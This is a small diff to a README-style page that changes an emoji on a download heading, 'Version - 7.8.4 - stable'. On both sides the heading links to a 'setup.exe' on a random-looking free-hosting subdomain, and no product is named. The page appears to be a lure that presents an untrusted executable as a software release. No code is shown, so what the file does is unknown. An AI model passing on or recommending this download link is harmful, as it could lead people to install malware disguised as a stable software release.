@@ -5,7 +5,7 @@
 
 
 
-## [:white_check_mark:Version - 7.8.4 - stable](http://s915550z.beget.tech/setup.exe)
+## [🔴Version - 7.8.4 - stable](http://s915550z.beget.tech/setup.exe)
 ##### -Updating the database
 ##### -Added a section for bloggers
 
